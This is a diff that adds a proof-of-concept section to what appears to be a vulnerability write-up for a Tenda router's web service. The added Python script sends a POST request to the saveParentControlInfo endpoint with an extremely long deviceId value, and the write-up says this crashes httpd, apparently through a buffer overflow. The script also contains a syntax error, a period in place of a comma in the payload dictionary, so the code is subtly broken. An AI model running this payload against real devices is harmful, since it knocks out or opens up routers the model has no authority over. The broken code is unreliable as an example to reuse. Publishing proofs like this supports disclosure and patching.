@@ -63,3 +63,37 @@ You can see that httpd crashed
 
 <img src="./Tenda/image-20210826120822098.png" alt="image-20210826120822098" style="zoom:50%;" />
 
+##### POC
+```
+import requests
+
+url = "http://192.168.33.6/goform/saveParentControlInfo"
+
+payload={
+  "deviceId":"2a%3A3a%3A44%3A7e%3A33%3A1eaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+  "deviceName":"ddd",
+  "enable":"1",
+  "time":"19%3A00-21%3A00",
+  "url_enable":"1",
+  "urls":"123".
+  "day":"1%2C1%2C1%2C1%2C1%2C1%2C1",
+  "limit_type":"0"
+}
+headers = {
+  "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
+  "Accept":"*/*",
+  "Accept-Language":"en-US,en;q=0.5",
+  "Accept-Encoding":"gzip, deflate",
+  "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
+  "X-Requested-With":"XMLHttpRequest",
+  "Content-Length":275,
+  "Origin":"http://192.168.33.6",
+  "Connection":"close",
+  "Referer":"http://192.168.33.6/parental_control.html?random=0.8184817073009409&"
+}
+
+response = requests.request("POST", url, headers=headers, data=payload)
+
+print(response.text)
+```
+
